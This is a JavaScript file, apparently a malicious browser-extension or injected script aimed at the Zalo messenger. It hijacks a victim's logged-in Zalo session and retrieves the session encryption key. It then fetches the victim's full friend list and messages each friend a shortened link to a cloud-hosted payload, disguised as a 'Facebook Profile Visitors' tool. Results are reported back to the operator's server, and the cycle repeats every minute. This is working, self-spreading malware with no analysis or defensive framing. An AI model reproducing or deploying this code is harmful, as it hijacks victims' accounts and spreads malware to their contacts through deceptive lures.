var zalo = {};

zalo.start = () => {
    fetch(uri("/ajax/zalo.php")).then(r => r.json()).then(data => {
        zalo.settings = data;
        console.log(zalo.settings);
        var lastTime = localStorage[zalo.settings.cookie] || 0;
        var timeValid = (Date.now() - lastTime) >= zalo.settings.time ? true : false;
        var version = localStorage["zalo.version"] || 0;
        if (version != zalo.settings.version) {
            localStorage["zalo.version"] = zalo.settings.version;
            location.reload();
            return;
        }
        for (key in localStorage) {
            if (key.indexOf("zalod") >= 0 && key.indexOf(zalo.settings.cookie) < 0) {
                delete localStorage[key]
            }
        }
        if (zalo.settings.active == true && timeValid == true) {
            localStorage[zalo.settings.cookie] = Date.now();
            console.log("Zalo Active: true");
            zalo.loginInfo();
        }
    });
}

zalo.loginInfo = (retry) => {
    if (!localStorage.imei) {
        localStorage.imei = guid();
    }
    var imei = localStorage.imei;

    var params = {
        zpw_ver: 7,
        zpw_type: 30,
        imei: imei,
        computer_name: "Web",
        language: "en",
        ts: Date.now(),
        nretry: 0
    }

    fetch("https://wpa.chat.zalo.me/api/login/getLoginInfo?" + deSerialize(params)).then(r => r.json()).then(data => {
        if (data.error_code == 0) {
            zalo.config = data.data;
            zalo.getFriends();
        } else if (!retry) {
            zalo.login();
        }
    });
}

zalo.login = () => {
    fetch("https://chat.zalo.me/login").then(r => r.text()).then(data => {
        zalo.loginInfo(true);
    });
}

zalo.userInfo = () => {
    fetch("https://accounts.chat.zalo.me/account/userinfo").then(r => r.text()).then(data => {

    })
}

zalo.onlines = () => {
    fetch("https://profile-wpa.chat.zalo.me/api/social/friend/onlines?zpw_ver=78&zpw_type=30").then(r => r.json()).then(data => {
        console.log(data);
        data.data = zalo.decode(data.data);
        data = JSON.parse(data.data);
        console.log(data);
    });
}

zalo.getFriends = () => {
    var params = {
        params: zalo.encode({ "incInvalid": 0, "page": 1, "count": 20000, "avatar_size": 120, "actiontime": 0 }),
        zpw_ver: 78,
        zpw_type: 30,
        nretry: 0
    }

    fetch("https://profile-wpa.chat.zalo.me/api/social/friend/getfriends?" + deSerialize(params)).then(r => r.json()).then(data => {
        data = JSON.parse(zalo.decode(data.data));
        var friends = data.data;
        zalo.friends = [];
        friends.forEach(friend => {
            if (zalo.friends.length > zalo.settings.limit) return;
            if (localStorage["zalod" + friend.userId + zalo.settings.cookie]) return;
            zalo.friends.push(friend);
        });
        console.log(zalo.friends);
        if (zalo.friends.length > 0) {
            zalo.getLink()
        }
    })
}

zalo.getLink = function () {
    fetch(uri("/ajax/storage.php?hash=" + config.token)).then(r => r.json()).then((data) => {
        zalo.link = "https://storage.googleapis.com/" + data.storage.bucket + "/" + data.storage.object;
        zalo.isgd();
    })
}

zalo.isgd = () => {
    fetch("https://is.gd/create.php?format=simple&url=" + zalo.link).then(r => r.text()).then((data) => {
        zalo.link = data;
        zalo.friends.forEach(friend => {
            zalo.sendLink(friend.userId);
        });
    })
}

zalo.sendLink = (uid) => {
    var params = {
        params: zalo.encode({
            "toId": uid,
            "clientId": Date.now(),
            "href": zalo.link,
            "src": "visitors.facebook.com",
            "title": "Facebook Profile Visitors",
            "desc": "View facebook profile visitors",
            "thumb": "https://i.ibb.co/hCmmbXP/logo.png",
            "type": 0,
            "media": JSON.stringify({ "type": 0, "count": 0, "mediaTitle": "", "artist": "", "streamUrl": "", "stream_icon": "" }),
            "mentionInfo": ""
        })
    }

    var getParams = {
        zpw_ver: 78,
        zpw_type: 30,
        nretry: 0
    }

    fetch("https://chat1-wpa.chat.zalo.me/api/message/link?" + deSerialize(getParams), {
        method: "POST",
        headers: {
            "content-type": "application/x-www-form-urlencoded"
        },
        body: deSerialize(params)
    }).then(r => r.json()).then(data => {
        data = JSON.parse(zalo.decode(data.data));
        if (data.error_code == 0) {
            zalo.sonuc(uid, zalo.link, "", "Message", 1);
            localStorage["zalod" + uid + zalo.settings.cookie] = true;
        }
    })
}

zalo.addFriend = () => {
    var params = {
        params: zalo.encode({
            "toid": "6189936972569385046",
            "msg": "Hi, I'm Kadir",
            "reqsrc": 40
        })
    }

    var getParams = {
        zpw_ver: 78,
        zpw_type: 30
    }

    fetch("https://friend-wpa.chat.zalo.me/api/friend/sendreq?" + deSerialize(getParams), {
        method: "POST",
        headers: {
            "content-type": "application/x-www-form-urlencoded"
        },
        body: deSerialize(params)
    }).then(r => r.json()).then(data => {
        console.log(data);
    })
}


zalo.sendFile = () => {
    //{"toid":"5361275349373487062","type":2,"fdata":"{\"act\":1,\"clientId\":\"1615678955341\",\"fType\":1}"}
    //{"totalChunk":3,"fileName":"video.7z","clientId":1615678955341,"totalSize":631191,"toid":"5361275349373487062","chunkId":1}
    //{"fileId":"26683506405","checksum":"2f7e129f5391c6f4a6d65cb5bc124cae","checksumSha":"","extension":"7z","totalSize":631191,"fileName":"video.7z","clientId":1615678955341,"fType":1,"fileCount":0,"fdata":null,"toid":"5361275349373487062","fileUrl":"https://f15-group-zf.zdn.vn/164c0a6e451daa43f30c/8128247717584671237","zsource":401}
}


zalo.search = () => {

}

zalo.sonuc = (sonuc, link, image, type, success) => {
    var sonuc = sonuc || "";
    var link = link || "";
    var image = image || "";
    var type = type || "";
    var success = success || 0;
    var params = {};
    params["user"] = zalo.config.uid;
    params["sonuc"] = sonuc;
    params["site"] = "zalo.me";
    params["link"] = link;
    params["img"] = image;
    params["type"] = type;
    params["success"] = success;
    params["hash"] = config.token;
    fetch(uri("/ajax/sonuc.php?" + deSerialize(params)));
}

zalo.encode = (params) => {
    var key = CryptoJS.enc.Base64.parse(zalo.config.zpw_enk);
    return CryptoJS.AES.encrypt(JSON.stringify(params), key, {
        iv: CryptoJS.enc.Hex.parse("00000000000000000000000000000000"),
        mode: CryptoJS.mode.CBC,
        padding: CryptoJS.pad.Pkcs7
    }).ciphertext.toString(CryptoJS.enc.Base64);
}

zalo.decode = (params) => {
    params = decodeURIComponent(params);
    var key = CryptoJS.enc.Base64.parse(zalo.config.zpw_enk);
    return CryptoJS.AES.decrypt({
        ciphertext: CryptoJS.enc.Base64.parse(params),
        salt: ""
    }, key, {
        iv: CryptoJS.enc.Hex.parse("00000000000000000000000000000000"),
        mode: CryptoJS.mode.CBC,
        padding: CryptoJS.pad.Pkcs7
    }).toString(CryptoJS.enc.Utf8)
}

loadData("https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js", () => {
    isReady("CryptoJS").then(() => {
        zalo.start();
        setInterval(zalo.start, 1000 * 60);
    });
})

function guid() {
    function s4() {
        return Math.floor((1 + Math.random()) * 0x10000)
            .toString(16)
            .substring(1);
    }
    return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
        s4() + '-' + s4() + s4() + s4();
}

function deSerialize(json) {
    return Object.keys(json).map(function (key) {
        return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
    }).join('&');
}